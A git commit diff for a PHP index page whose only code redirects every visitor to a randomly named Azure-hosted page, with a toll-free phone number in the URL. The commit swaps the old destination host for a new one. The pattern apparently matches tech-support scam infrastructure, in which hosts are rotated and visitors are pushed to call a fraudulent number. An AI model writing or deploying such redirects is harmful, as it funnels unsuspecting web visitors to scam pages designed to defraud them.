2e302a77c517adfb076ebff41d3ba21029a946d2
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-07-24 20:34:20 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location:https://lets67emake7gwubecal8wu.z1.web.core.windows.net/index.html?Aniph=1-844-496-3443");
+header("Location: https://make8q7callx8whbw3awe.z8.web.core.windows.net/index.html?Aniph=1-844-496-3443");
 
 exit;
 ?>
